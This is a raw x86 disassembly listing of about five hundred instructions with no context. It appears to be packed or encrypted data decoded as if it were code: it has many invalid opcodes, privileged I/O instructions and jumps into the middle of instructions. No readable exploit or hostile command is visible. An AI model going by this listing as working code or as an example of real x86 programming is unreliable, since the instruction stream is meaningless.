  41dbf2:	stos   BYTE PTR es:[edi],al
  41dbf3:	js     0x41dbe0
  41dbf5:	daa    
  41dbf6:	lea    eax,[edi-0x3b]
  41dbf9:	sbb    al,0x44
  41dbfb:	int3   
  41dbfc:	icebp  
  41dbfd:	jge    0x41dbca
  41dbff:	add    eax,0x633bc63b
  41dc04:	outs   dx,DWORD PTR ds:[esi]
  41dc05:	adc    esp,DWORD PTR [esi+0x6ec028b8]
  41dc0b:	add    edi,ebp
  41dc0d:	es aad 0xad
  41dc10:	int    0x5a
  41dc12:	mov    edi,0x17ec392d
  41dc17:	ins    DWORD PTR es:[edi],dx
  41dc18:	dec    eax
  41dc19:	or     al,0x9c
  41dc1b:	dec    eax
  41dc1c:	in     al,0x33
  41dc1e:	mov    bh,0x9c
  41dc20:	jbe    0x41dc65
  41dc22:	xor    al,0xd4
  41dc24:	imul   ecx,eax,0x45b1f981
  41dc2a:	sbb    eax,0xebd9096c
  41dc2f:	sbb    DWORD PTR [esi],eax
  41dc31:	adc    eax,0x12e7dccd
  41dc36:	loop   0x41dc37
  41dc38:	inc    DWORD PTR [ebp+0x701a84d2]
  41dc3e:	sbb    al,0x68
  41dc40:	fcmovu st,st(2)
  41dc42:	mov    edx,DWORD PTR [eax]
  41dc44:	aaa    
  41dc45:	or     BYTE PTR [esi],bh
  41dc47:	xor    al,0x6
  41dc49:	cmp    bh,BYTE PTR [edx+0x61]
  41dc4c:	jecxz  0x41dc98
  41dc4e:	ret    0x7bf8
  41dc51:	cdq    
  41dc52:	mov    ds:0x7acba69,al
  41dc57:	lock dec esp
  41dc59:	call   0x4d76afe1
  41dc5e:	rcl    DWORD PTR [edi],cl
  41dc60:	loopne 0x41dc32
  41dc62:	fsub   st,st(4)
  41dc64:	ror    BYTE PTR [ebp-0x2d],1
  41dc67:	xor    al,0x5d
  41dc69:	in     al,dx
  41dc6a:	bswap  eax
  41dc6c:	cmp    al,al
  41dc6e:	je     0x41dc28
  41dc70:	xor    al,0x5d
  41dc72:	shl    DWORD PTR ds:0x70b00758,cl
  41dc78:	push   gs
  41dc7a:	sbb    BYTE PTR [ecx+0x2e],ch
  41dc7d:	dec    ebp
  41dc7e:	shl    DWORD PTR [eax+0x14489820],cl
  41dc84:	nop
  41dc85:	scas   al,BYTE PTR es:[edi]
  41dc86:	imul   ebx,DWORD PTR [edx+0x44881ca6],0x75179c80
  41dc90:	lahf   
  41dc91:	imul   ebx,DWORD PTR [edx+0x7f708878],0xee300768
  41dc9b:	xor    ebx,DWORD PTR [ebp-0x2d]
  41dc9e:	pop    ss
  41dc9f:	pusha  
  41dca0:	sub    al,0xf
  41dca2:	pop    eax
  41dca3:	dec    edi
  41dca4:	push   eax
  41dca5:	pop    es
  41dca6:	je     0x41dcf5
  41dca8:	xlat   BYTE PTR ds:[ebx]
  41dca9:	jge    0x41dcfa
  41dcab:	dec    eax
  41dcac:	ja     0x41dc8e
  41dcae:	pop    es
  41dcaf:	inc    eax
  41dcb0:	mov    esp,0x74d73827
  41dcb5:	dec    ebp
  41dcb6:	xlat   BYTE PTR ds:[ebx]
  41dcb7:	test   BYTE PTR [edi],al
  41dcb9:	xor    ah,cl
  41dcbb:	pop    ss
  41dcbc:	sub    BYTE PTR [eax+0x74d17b2f],al
  41dcc2:	dec    ebp
  41dcc3:	and    BYTE PTR [eax],dl
  41dcc5:	pop    ss
  41dcc6:	sbb    BYTE PTR [eax],ch
  41dcc8:	scas   eax,DWORD PTR es:[edi]
  41dcc9:	adc    ebx,DWORD PTR [edx+0x10a654ee]
  41dccf:	nop
  41dcd0:	daa    
  41dcd1:	or     al,0xa0
  41dcd3:	call   0x2308:0xbc1bac1
  41dcda:	les    edx,FWORD PTR [edi]
  41dcdc:	add    al,0x8c
  41dcde:	xor    eax,0xbc19a4f
  41dce3:	add    al,cl
  41dce5:	inc    ecx
  41dce6:	cld    
  41dce7:	rcl    dh,0x3c
  41dcea:	imul   ebx,DWORD PTR [esi-0x5707bec5],0xb24f441
  41dcf4:	iret   
  41dcf5:	or     al,0xd6
  41dcf7:	or     al,0xf0
  41dcf9:	cwde   
  41dcfa:	and    ebp,esp
  41dcfc:	push   ebx
  41dcfd:	ror    BYTE PTR [esi+edx*8],cl
  41dd00:	jl     0x41dd19
  41dd02:	call   0xe125e883
  41dd07:	ror    BYTE PTR [esi+edx*8],cl
  41dd0a:	or     al,0xe0
  41dd0c:	fadd   DWORD PTR [edi-0x24]
  41dd0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd10:	(bad)  
  41dd11:	or     al,0xd2
  41dd13:	or     al,0xd8
  41dd15:	adc    al,0xd4
  41dd17:	cld    
  41dd18:	or     edx,esi
  41dd1a:	or     al,0xd6
  41dd1c:	or     al,0xd0
  41dd1e:	mov    BYTE PTR [ebx],ah
  41dd20:	int3   
  41dd21:	aam    0xb
  41dd23:	(bad)  
  41dd24:	or     al,0xd6
  41dd26:	or     al,0xc8
  41dd28:	pusha  
  41dd29:	and    eax,esp
  41dd2b:	hlt    
  41dd2c:	pop    ss
  41dd2d:	(bad)  
  41dd2e:	or     al,0xd6
  41dd30:	or     al,0xc0
  41dd32:	push   esp
  41dd33:	or     edi,DWORD PTR [eax+edx*4-0x2df32dc5]
  41dd3a:	or     al,0xb8
  41dd3c:	pop    esp
  41dd3d:	mov    ah,0x4
  41dd3f:	(bad)  
  41dd40:	or     al,0xd6
  41dd42:	or     al,0xb0
  41dd44:	test   BYTE PTR [edi],dl
  41dd46:	lods   al,BYTE PTR ds:[esi]
  41dd47:	inc    eax
  41dd48:	jecxz  0x41dd19
  41dd4a:	sbb    eax,0x48a80cb2
  41dd4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd50:	or     ecx,DWORD PTR [ecx]
  41dd52:	(bad)  
  41dd53:	or     al,0xd2
  41dd55:	jl     0x41dd92
  41dd57:	mov    al,ds:0xbdc9c78
  41dd5c:	lods   al,BYTE PTR ds:[esi]
  41dd5d:	cmp    esp,ecx
  41dd5f:	or     al,0x98
  41dd61:	imul   edx,DWORD PTR [eax+edi*8-0x6788a7c5],0x19
  41dd69:	nop
  41dd6a:	ja     0x41dcf8
  41dd6c:	and    ebp,DWORD PTR [ebx+ecx*1+0x33583358]
  41dd73:	mov    BYTE PTR [eax+0x23],dh
  41dd76:	test   BYTE PTR [eax],cl
  41dd78:	cmp    ecx,DWORD PTR [eax+0x33]
  41dd7b:	pop    eax
  41dd7c:	xor    eax,DWORD PTR [eax+0x387c1774]
  41dd82:	dec    esi
  41dd83:	xor    ebx,DWORD PTR [eax+0x33]
  41dd86:	pop    eax
  41dd87:	xor    BYTE PTR [ebx],bh
  41dd89:	push   esp
  41dd8a:	in     al,0x4e
  41dd8c:	repnz nop
  41dd8e:	cmp    BYTE PTR [ebx-0x77a83a50],0x3a
  41dd95:	xor    dl,BYTE PTR [ecx-0x78]
  41dd98:	fbstp  TBYTE PTR [eax-0x80]
  41dd9b:	push   edi
  41dd9c:	or     edx,esp
  41dd9e:	sar    DWORD PTR [ebp-0x54],cl
  41dda1:	ins    BYTE PTR es:[edi],dx
  41dda2:	add    al,0xa7
  41dda4:	cdq    
  41dda5:	cld    
  41dda6:	pop    ebp
  41dda7:	mov    ebp,0x427c9ea2
  41ddac:	dec    esp
  41ddad:	mov    ecx,0x21d09416
  41ddb2:	stc    
  41ddb3:	and    DWORD PTR [edi-0x46ebeb04],eax
  41ddb9:	pop    es
  41ddba:	push   eax
  41ddbb:	inc    ecx
  41ddbc:	sub    al,0xb9
  41ddbe:	add    cl,BYTE PTR [ebx+0x724c5]
  41ddc4:	add    BYTE PTR [esi+esi*2],ah
  41ddc7:	pop    esp
  41ddc8:	stc    
  41ddc9:	es or  edx,esp
  41ddcc:	test   BYTE PTR [ecx-0x697ff0c0],ah
  41ddd2:	int    0x26
  41ddd4:	sbb    esp,eax
  41ddd6:	dec    eax
  41ddd7:	push   ebx
  41ddd8:	ds add esp,esp
  41dddb:	add    cl,bh
  41dddd:	adc    al,0x1c
  41dddf:	add    BYTE PTR ds:0x56f25720,bl
  41dde5:	sar    BYTE PTR [ecx+0x269ca00c],1
  41ddeb:	cdq    
  41ddec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dded:	fwait
  41ddee:	xchg   edx,eax
  41ddef:	or     DWORD PTR [eax+0x64999094],ebx
  41ddf5:	xchg   edx,eax
  41ddf6:	dec    ecx
  41ddf7:	mov    BYTE PTR [eax+edi*2+0xf24dd23],al
  41ddfe:	inc    eax
  41ddff:	int3   
  41de00:	mov    eax,0xf2b43313
  41de05:	adc    al,BYTE PTR [edx-0x334ff4de]
  41de0b:	jns    0x41de7f
  41de0d:	adc    al,BYTE PTR [edx]
  41de0f:	jg     0x41ddc2
  41de11:	cmp    BYTE PTR [ebx+0x59b762d],al
  41de17:	test   DWORD PTR [ecx],0x8077ff73
  41de1d:	sub    dl,ah
  41de1f:	or     DWORD PTR [ebp+0xbe0b46c],ebp
  41de25:	jp     0x41de23
  41de27:	push   0x5d
  41de29:	xlat   BYTE PTR ds:[ebx]
  41de2a:	xchg   DWORD PTR [eax+0x75],ebx
  41de2d:	and    eax,DWORD PTR [esi-0x46]
  41de30:	xor    eax,0x1991f4c
  41de35:	sti    
  41de36:	sbb    eax,0x7c9a867e
  41de3b:	test   al,0xc2
  41de3d:	mov    ds:0xc0747240,eax
  41de42:	push   0xcf3fb1c9
  41de47:	xor    BYTE PTR [eax+0x72],bh
  41de4a:	xchg   edx,eax
  41de4b:	xchg   edi,eax
  41de4c:	adc    BYTE PTR [ebx-0x67a88a4f],bh
  41de52:	mov    ds:0xb15e485b,eax
  41de57:	jl     0x41de77
  41de59:	add    ebx,eax
  41de5b:	retf   
  41de5c:	xor    cl,al
  41de5e:	pop    eax
  41de5f:	sbb    DWORD PTR [eax],ebp
  41de61:	pop    es
  41de62:	and    al,0x20
  41de64:	and    DWORD PTR [esi+0x4f1c0c10],ecx
  41de6a:	jge    0x41de7c
  41de6c:	stos   BYTE PTR es:[edi],al
  41de6d:	fadd   QWORD PTR [eax-0x47467e46]
  41de73:	add    DWORD PTR [edi-0x5f74e815],edx
  41de79:	mov    ebx,0x50180854
  41de7e:	add    al,0x14
  41de80:	or     ecx,DWORD PTR [ebx-0x58f2216b]
  41de86:	mov    cl,0x9c
  41de88:	pop    ebp
  41de89:	ret    0x2fb4
  41de8c:	es in  al,0x32
  41de8f:	add    edx,DWORD PTR [eax]
  41de91:	mov    al,ds:0xb3670c0b
  41de96:	mov    al,BYTE PTR [esi]
  41de98:	adc    BYTE PTR [ebx-0x63734d52],al
  41de9e:	ins    BYTE PTR es:[edi],dx
  41de9f:	xchg   ebx,eax
  41dea0:	push   esi
  41dea1:	fs or  al,0xbb
  41dea4:	and    BYTE PTR [ebp+0xd],bh
  41dea7:	xchg   edx,eax
  41dea8:	adc    eax,0x140a3bf5
  41dead:	ins    DWORD PTR es:[edi],dx
  41deae:	adc    eax,DWORD PTR ds:0x99b8ae5f
  41deb4:	sbb    al,0x85
  41deb6:	fmul   DWORD PTR [ebx]
  41deb8:	mov    eax,ds:0x443c80e
  41debd:	mov    dl,0x5d
  41debf:	(bad)  
  41dec0:	or     DWORD PTR [ebx-0x10],esi
  41dec3:	xchg   esi,eax
  41dec4:	lock pop ecx
  41dec6:	push   0xc8176bcf
  41decb:	sub    edx,DWORD PTR [eax-0x363f8e3e]
  41ded1:	adc    DWORD PTR [eax+0x2eb32043],0x90272047
  41dedb:	xchg   esp,eax
  41dedc:	mov    bl,0x35
  41dede:	call   0x108a:0x2057902e
  41dee5:	mov    eax,ds:0xc0872103
  41deea:	xlat   BYTE PTR ds:[ebx]
  41deeb:	mov    ah,0x6
  41deed:	in     al,dx
  41deee:	nop
  41deef:	dec    eax
  41def0:	dec    esi
  41def1:	pusha  
  41def2:	imul   esi,DWORD PTR [ebp+ecx*1+0xb3d8320],0x53
  41defa:	clc    
  41defb:	clc    
  41defc:	jno    0x41de83
  41defe:	fwait
  41deff:	pop    edi
  41df00:	mov    dl,0x4c
  41df02:	sub    eax,0x558df8f8
  41df07:	jmp    DWORD PTR [eax-0x5c]
  41df0a:	xchg   esi,eax
  41df0b:	jb     0x41df0c
  41df0d:	and    eax,0x1ff7d80
  41df12:	cmc    
  41df13:	sbb    eax,eax
  41df15:	mov    dl,dh
  41df17:	add    dl,BYTE PTR [ebp+ebp*1-0x36813f3f]
  41df1e:	clc    
  41df1f:	jle    0x41dea2
  41df21:	retf   0xb0b1
  41df24:	jmp    0x41df07
  41df26:	pop    ebx
  41df27:	inc    ebx
  41df28:	push   es
  41df29:	jae    0x41debf
  41df2b:	sub    al,0x84
  41df2d:	clc    
  41df2e:	push   ss
  41df2f:	and    edi,DWORD PTR [edx]
  41df31:	nop
  41df32:	adc    BYTE PTR [ebx],bl
  41df34:	out    dx,eax
  41df35:	iret   
  41df36:	push   eax
  41df37:	into   
  41df38:	add    al,0x75
  41df3a:	jno    0x41defc
  41df3c:	cmp    DWORD PTR [edx],eax
  41df3e:	cmp    DWORD PTR [eax-0x24cc0bf1],esi
  41df44:	icebp  
  41df45:	call   DWORD PTR [edx+0x30d2d843]
  41df4b:	nop
  41df4c:	outs   dx,DWORD PTR ds:[esi]
  41df4d:	mov    ch,0x68
  41df4f:	dec    edx
  41df50:	push   ds
  41df51:	and    DWORD PTR [edi+0x6fb5d081],ebp
  41df57:	or     DWORD PTR [ecx+eiz*1+0x64dc1499],eax
  41df5e:	add    cl,BYTE PTR [edx]
  41df60:	pop    ss
  41df61:	test   al,0x1f
  41df63:	ins    BYTE PTR es:[edi],dx
  41df64:	or     BYTE PTR [ecx],al
  41df66:	inc    esp
  41df67:	sbb    DWORD PTR [ebx],edi
  41df69:	push   ss
  41df6a:	push   ecx
  41df6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df6c:	jns    0x41dfcf
  41df6e:	inc    eax
  41df6f:	jae    0x41df85
  41df71:	jmp    0x41df7b
  41df73:	popa   
  41df74:	add    bl,ah
  41df76:	aad    0x90
  41df78:	push   ebx
  41df79:	nop
  41df7a:	rol    DWORD PTR [esi],0x19
  41df7d:	sbb    BYTE PTR [edi+eax*1],dl
  41df80:	adc    BYTE PTR [ecx+0x43],al
  41df83:	adc    BYTE PTR [ebx+0xc],ch
  41df86:	xor    ebx,DWORD PTR [esi]
  41df88:	rcr    DWORD PTR [esi+0x2d],cl
  41df8b:	push   0x43
  41df8d:	mov    DWORD PTR [ecx-0x4],edi
  41df90:	test   DWORD PTR [edx+ecx*2+0x0],edx
  41df94:	xchg   ecx,eax
  41df95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df96:	nop
  41df97:	cld    
  41df98:	mov    ecx,0x86ba8857
  41df9d:	leave  
  41df9e:	add    bl,BYTE PTR ds:0x2bf90c2
  41dfa4:	jo     0x41e014
  41dfa6:	rcl    BYTE PTR [ecx-0x62],0xb8
  41dfaa:	xor    BYTE PTR [ecx-0x3f04591e],bl
  41dfb0:	push   ebp
  41dfb1:	cmp    eax,0x4012b8a8
  41dfb6:	mov    dh,0x8
  41dfb8:	pop    ecx
  41dfb9:	cs jns 0x41df82
  41dfbc:	mov    edx,0xd8159c3a
  41dfc1:	push   esp
  41dfc2:	mov    al,ds:0x4b92e467
  41dfc7:	pop    esp
  41dfc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dfc9:	in     al,0x2e
  41dfcb:	mov    ecx,0xa86492e4
  41dfd0:	ins    BYTE PTR es:[edi],dx
  41dfd1:	lods   al,BYTE PTR ds:[esi]
  41dfd2:	mov    ecx,0x744b92e4
  41dfd7:	mov    al,0x7c
  41dfd9:	in     al,0x92
  41dfdb:	dec    ebx
  41dfdc:	cs mov ah,0x84
  41dfdf:	mov    eax,0xb92e4b92
  41dfe4:	mov    WORD PTR [esp+edx*4-0x1b46d1b5],?
  41dfeb:	rcr    BYTE PTR [esp+eax*8-0x6d1b986e],0xa4
  41dff3:	enter  0xacf0,0xe7
  41dff7:	xchg   edx,eax
  41dff8:	addr16 in al,0xcc
  41dffb:	cld    
  41dffc:	mov    ah,0xd0
  41dffe:	iret   
  41dfff:	enter  0xcf25,0xb2
  41e003:	push   0xd4d4d4c4
  41e008:	dec    ebx
  41e009:	sahf   
  41e00a:	iret   
  41e00b:	and    eax,0xe440b3d8
  41e010:	lahf   
  41e011:	dec    ebx
  41e012:	sahf   
  41e013:	xchg   ecx,eax
  41e014:	fsubr  QWORD PTR [esp+esi*8-0x61e74b20]
  41e01b:	xchg   ecx,eax
  41e01c:	dec    ebx
  41e01d:	ss mov ecx,0x1498e404
  41e023:	xchg   edi,eax
  41e024:	cmp    al,0x9f
  41e026:	dec    ebx
  41e027:	call   0xec65e8e1
  41e02c:	add    al,0x97
  41e02e:	cmp    al,0x23
  41e030:	js     0x41e066
  41e032:	lock inc eax
  41e034:	leave  
  41e035:	cmp    BYTE PTR [edi+0x656c6f8b],0x61
  41e03c:	jne    0x41e0b2
  41e03e:	pop    ebx
  41e03f:	mov    eax,0x5959e881
  41e044:	inc    ebx
  41e045:	push   0x7079544d
  41e04a:	enter  0x7fb1,0x2d
  41e04e:	pop    esp
  41e04f:	adc    ecx,DWORD PTR [esi+0x65]
  41e052:	add    BYTE PTR [bx],al
  41e055:	outs   dx,DWORD PTR ds:[esi]
  41e056:	je     0x41e07b
  41e058:	(bad)  
  41e059:	cmp    al,0xf2
  41e05b:	inc    ecx
  41e05c:	fs fs push ebx
  41e05f:	jne    0x41e0c3
  41e061:	dec    ebp
  41e062:	jne    0x41e0d0
  41e064:	inc    esp
  41e065:	into   
  41e066:	jle    0x41e056
  41e068:	enter  0x7669,0x49
  41e06c:	or     BYTE PTR fs:[edi],dl
  41e06f:	outs   dx,DWORD PTR ds:[esi]
  41e070:	fs das 
  41e072:	outs   dx,BYTE PTR ds:[esi]
  41e073:	jns    0x41e059
  41e075:	xchg   ecx,eax
  41e076:	dec    edi
  41e077:	dec    edi
  41e078:	jb     0x41e07a
  41e07a:	pop    eax
  41e07b:	outs   dx,DWORD PTR ds:[esi]
  41e07c:	jb     0x41e0c1
  41e07e:	ins    DWORD PTR es:[edi],dx
  41e07f:	jo     0x41e012
  41e081:	jl     0x41e072
  41e083:	aas    
  41e084:	xor    al,0x46
  41e086:	jb     0x41e0f7
  41e088:	ins    DWORD PTR es:[edi],dx
  41e089:	push   ebx
  41e08a:	je     0x41e0aa
  41e08c:	rsqrtps xmm3,XMMWORD PTR [edi-0x4e]
  41e090:	pop    edi
  41e091:	enter  0x4438,0x61
  41e095:	je     0x41e0fc
  41e097:	adc    DWORD PTR [edi+0x79],eax
  41e09a:	ja     0x41e0e7
  41e09c:	jle    0x41e0ff
  41e09e:	pop    ds
  41e09f:	inc    edx
  41e0a0:	outs   dx,DWORD PTR ds:[esi]
  41e0a1:	outs   dx,DWORD PTR ds:[esi]
  41e0a2:	ins    BYTE PTR es:[edi],dx
  41e0a3:	(bad)  
  41e0a5:	je     0x41e119
  41e0a7:	pusha  
  41e0a8:	das    
  41e0a9:	and    DWORD PTR [edi],edi
  41e0ab:	inc    ebx
  41e0ac:	jns    0x41e0ae
  41e0ae:	inc    edi
  41e0af:	cmovo  ebx,DWORD PTR [esi+0x12]
  41e0b3:	outs   dx,DWORD PTR ds:[esi]
  41e0b4:	aaa    
  41e0b5:	repz mov ecx,0x7253169
  41e0bb:	fs hlt 
  41e0bd:	mov    ecx,0x28a8f470
  41e0c2:	cmp    eax,0x5a05926c
  41e0c7:	xor    al,0x4b
  41e0c9:	cmp    eax,DWORD PTR [edx+0x10]
  41e0cc:	mov    cl,0xd3
  41e0ce:	adc    bh,bh
  41e0d0:	and    BYTE PTR [esi+ebp*4],cl
  41e0d3:	fwait
  41e0d4:	ins    BYTE PTR es:[edi],dx
  41e0d5:	pop    ss
  41e0d6:	sub    eax,0x800974df
  41e0db:	inc    ecx
  41e0dc:	test   DWORD PTR [ebx],eax
  41e0de:	or     DWORD PTR [edx+ebp*1],ebp
  41e0e1:	call   0x1990:0x36d49c92
  41e0e8:	in     al,dx
  41e0e9:	mov    ecx,0x8b1408a6
  41e0ee:	pop    edx
  41e0ef:	mov    ecx,0x90a790b2
  41e0f4:	cmp    BYTE PTR [ebx+0x690c5cba],0x9a
  41e0fb:	fild   DWORD PTR [ebx]
  41e0fd:	fimul  WORD PTR [ebx+eax*1+0x501c90df]
  41e104:	mov    bh,0xd9
  41e106:	call   0xdd1b:0x186c30a6
  41e10d:	ffree  st(4)
  41e10f:	and    edx,edi
  41e111:	jne    0x41e17a
  41e113:	cmp    edx,DWORD PTR [edi]
  41e115:	sbb    esi,esp
  41e117:	add    ebx,ebp
  41e119:	test   eax,0x1fde4fdf
  41e11e:	shr    DWORD PTR [eax],0x14
  41e121:	jle    0x41e101
  41e123:	or     al,0x12
  41e125:	push   esp
  41e126:	inc    ebx
  41e127:	jne    0x41e150
  41e129:	and    al,0x23
  41e12b:	add    dh,dl
  41e12d:	jmp    0x18d4:0xba4b1d1e
  41e134:	mov    ah,BYTE PTR [eax-0x35]
  41e137:	mov    bl,0xb3
  41e139:	add    BYTE PTR [eax+0x8],ah
  41e13c:	adc    eax,0x5410f922
  41e141:	loopne 0x41e17e
  41e143:	mov    edx,0x392876ec
  41e148:	jb     0x41e104
  41e14a:	in     al,dx
  41e14b:	push   edi
  41e14c:	cwde   
  41e14d:	push   ss
  41e14e:	inc    ebp
  41e14f:	pop    edx
  41e150:	inc    ecx
  41e151:	ret    
  41e152:	and    BYTE PTR [edx],cl
  41e154:	out    dx,al
  41e155:	repnz and bh,BYTE PTR [ebx]
  41e158:	or     bh,dh
  41e15a:	mov    ebx,0x50bb6350
  41e15f:	inc    ecx
  41e160:	add    DWORD PTR [ebx+0x4],edi
  41e163:	adc    eax,0x9b25d445
  41e168:	popa   
  41e169:	sbb    BYTE PTR [edx-0x6d],bl
  41e16c:	arpl   WORD PTR [edx+ecx*1-0x4bf37ab6],si
  41e173:	and    ah,cl
  41e175:	rol    DWORD PTR fs:[ebp+0x2b18bc63],0x43
  41e17d:	jb     0x41e183
  41e17f:	repnz mov esp,0x19411718
  41e185:	dec    edx
  41e186:	mov    edx,0x656772d8
  41e18b:	arpl   WORD PTR [esp+edi*2-0x14],di
  41e18f:	loopne 0x41e12f
  41e191:	or     al,BYTE PTR [edx+0x61]
  41e194:	or     DWORD PTR fs:[ecx],esi
  41e197:	arpl   WORD PTR [edx],cx
  41e199:	popa   
  41e19a:	sub    BYTE PTR [ecx],bh
  41e19c:	loopne 0x41e17e
  41e19e:	sub    ebx,DWORD PTR [ebp+0x63973784]
  41e1a4:	retf   0x6564
  41e1a7:	js     0x41e1d4
  41e1a9:	mov    ebp,0x79023944
  41e1ae:	xchg   ecx,eax
  41e1af:	arpl   WORD PTR [ebp+0x46f1844],di
  41e1b5:	fisttp QWORD PTR [esi]
  41e1b7:	inc    ecx
  41e1b8:	pop    ebx
  41e1b9:	popa   
  41e1ba:	jns    0x41e1a1
  41e1bc:	imul   esp,DWORD PTR [ebp+0x64],0xffffff92
  41e1c0:	ins    DWORD PTR es:[edi],dx
  41e1c1:	dec    eax
  41e1c2:	inc    ecx
  41e1c3:	sti    
  41e1c4:	lods   al,BYTE PTR ds:[si]
  41e1c6:	scas   al,BYTE PTR es:[edi]
  41e1c7:	das    
  41e1c8:	dec    eax
  41e1c9:	xchg   BYTE PTR [ebx+eax*2-0x37739a8e],ch
  41e1d0:	mov    esp,esp
  41e1d2:	gs addr16 mov esi,0x6814be14
  41e1d9:	pusha  
  41e1da:	enter  0x1411,0xbd
  41e1de:	dec    ecx
  41e1df:	mov    eax,ds:0x7016c064
  41e1e4:	ins    BYTE PTR es:[edi],dx
  41e1e5:	arpl   WORD PTR [eax+0x9],di
  41e1e8:	push   eax
  41e1e9:	test   eax,0xa2cb78b0
  41e1ee:	sbb    BYTE PTR [edx+0x6],cl
  41e1f1:	ins    BYTE PTR es:[edi],dx
  41e1f2:	addr16 loopne 0x41e1d5
  41e1f5:	aaa    
  41e1f6:	or     ah,BYTE PTR [edi+0x6e5563c2]
  41e1fc:	sti    
  41e1fd:	pop    edi
  41e1fe:	arpl   WORD PTR [ecx+eiz*4+0x64],si
  41e202:	and    DWORD PTR [eax],ecx
  41e204:	call   0x68c2:0xa512bfff
  41e20b:	pop    ds
  41e20c:	arpl   WORD PTR [ebp+0x8],sp
  41e20f:	add    eax,0x9370c2e3
  41e214:	arpl   WORD PTR [eax+0x63],bp
  41e217:	jecxz  0x41e27b
  41e219:	enter  0x80b1,0xcf
  41e21d:	mov    edi,0xc9cf88a6
  41e222:	or     eax,0xfc70475e
  41e227:	mov    ebx,0x1643a104
  41e22c:	cmp    eax,0xadbf519b
  41e231:	leave  
  41e232:	or     al,0x2
  41e234:	add    eax,0xb0e48723
  41e239:	ins    BYTE PTR es:[edi],dx
  41e23a:	and    edx,DWORD PTR [ecx]
  41e23c:	adc    al,0xec
  41e23e:	add    ch,al
  41e240:	in     al,0x45
  41e242:	inc    ecx
  41e243:	dec    esi
  41e244:	inc    edx
  41e245:	xor    eax,0x5d6f3fc0
  41e24a:	je     0x41e1da
  41e24c:	in     al,0xdb
  41e24e:	pop    eax
  41e24f:	clc    
  41e250:	or     edx,DWORD PTR [ebx]
  41e252:	call   0x60afa8e2
  41e257:	shl    DWORD PTR [eax],1
  41e259:	call   0xc84e7656
  41e25e:	and    BYTE PTR [ebx-0x1b83b91c],bl
  41e264:	lock push ecx
  41e266:	mov    bh,0xea
  41e268:	xchg   ecx,eax
  41e269:	rol    BYTE PTR [esi+0x22],0xba
  41e26d:	add    esp,DWORD PTR [eax+0x11]
  41e270:	adc    BYTE PTR [eax-0x6310d8d1],0x90
  41e277:	or     DWORD PTR [ecx],edi
  41e279:	rcl    BYTE PTR [esi+0x3ca0ba58],0xa
  41e280:	cmp    DWORD PTR [ecx+0x2fc19dc0],eax
  41e286:	in     al,0x42
  41e288:	pop    esi
  41e289:	xchg   ecx,eax
  41e28a:	inc    edi
  41e28b:	mov    al,0x68
  41e28d:	in     al,0x5
  41e28f:	enter  0xc109,0x36
  41e293:	rol    DWORD PTR [esi+0x26427204],0x38
  41e29a:	mov    ebp,0xb006060
  41e29f:	in     al,0xc1
  41e2a1:	lea    ecx,[ebx+0x60]
  41e2a4:	adc    DWORD PTR [esp+ebp*2],edi
  41e2a7:	jmp    0x1052:0x77f5d5c3
  41e2ae:	(bad)  
  41e2af:	cmp    eax,0x8002000a
  41e2b4:	jg     0x41e2ef
  41e2b6:	in     eax,0x5
  41e2b8:	or     al,0xf6
  41e2ba:	stos   BYTE PTR es:[edi],al
  41e2bb:	push   eax
  41e2bc:	rcr    DWORD PTR ds:0x5c13277d,0x0
  41e2c3:	loopne 0x41e292
  41e2c5:	clc    
  41e2c6:	sub    eax,0x6700bffe
  41e2cb:	pop    esp
  41e2cc:	add    DWORD PTR [eax-0x3c01104d],ebx
  41e2d2:	pop    ecx
  41e2d3:	sub    eax,0x3f742308
  41e2d8:	dec    eax
  41e2d9:	je     0x41e33d
  41e2db:	push   cs
  41e2dc:	or     edi,DWORD PTR [ebx]
  41e2de:	(bad)  [eax+0x5]
  41e2e1:	icebp  
  41e2e2:	add    dh,BYTE PTR [edx]
  41e2e4:	lahf   
  41e2e5:	sbb    BYTE PTR [edx+0x1b],dh
  41e2e8:	fstp   DWORD PTR [edx+0x48]
  41e2eb:	adc    esp,eax
  41e2ed:	dec    ecx
  41e2ee:	cmp    edi,ebp
  41e2f0:	add    ah,ah
  41e2f2:	fnstenv [edi+0x58bf9e0b]
  41e2f8:	or     DWORD PTR [ecx+0x761c48d9],ebp
  41e2fe:	mov    cl,0x25
  41e300:	daa    
  41e301:	mov    esp,0xc0092530
  41e306:	dec    eax
  41e307:	xor    cl,al
  41e309:	xchg   cl,al
  41e30b:	das    
  41e30c:	clc    
  41e30d:	gs inc esi
  41e30f:	mov    ah,0xf8
  41e311:	fs repz sub eax,0xf4552f5b
  41e318:	inc    edi
  41e319:	in     al,0xbe
  41e31b:	sub    DWORD PTR [ebx],edi
  41e31d:	sbb    esp,esi
  41e31f:	xchg   esp,eax
  41e320:	and    eax,0x99487bf0
  41e325:	mov    dl,0x93
  41e327:	shl    DWORD PTR ds:0xec4bf8f0,0x94
  41e32e:	sbb    al,0x19
  41e330:	in     al,dx
  41e331:	mov    WORD PTR ds:0xe4c8bdec,fs
  41e337:	enter  0xdf60,0xe8
  41e33b:	xchg   edi,eax
  41e33c:	fsub   DWORD PTR ds:0x762cbee8
  41e342:	and    DWORD PTR [ebx],esp
  41e344:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e345:	adc    ebp,esp
  41e347:	int3   
  41e348:	and    eax,0x5ed9e419
  41e34d:	jmp    0x41e3c2
  41e34f:	dec    eax
  41e350:	loopne 0x41e302
  41e352:	loopne 0x41e3d0
  41e354:	inc    esp
  41e355:	add    esi,DWORD PTR [esi]
  41e357:	mov    edx,0x6d2819eb
  41e35c:	mov    edi,0xc86051d1
  41e361:	jge    0x41e32f
  41e363:	or     ecx,DWORD PTR [ecx-0x2bf92fa3]
  41e369:	mov    dl,0x71
  41e36b:	enter  0x8156,0xc4
  41e36f:	les    ebx,FWORD PTR [eax+0x2cb3c8d8]
  41e375:	int    0xdc
  41e377:	enter  0xc002,0x3c
  41e37b:	jo     0x41e37f
  41e37d:	cmp    DWORD PTR [edx],esi
  41e37f:	rcl    BYTE PTR [edi-0x68],0xc3
  41e383:	fdivr  QWORD PTR [ecx+0x23]
  41e386:	dec    eax
  41e387:	add    edi,DWORD PTR [eax-0x451f5afe]
  41e38d:	or     BYTE PTR [ebp+0x33],al
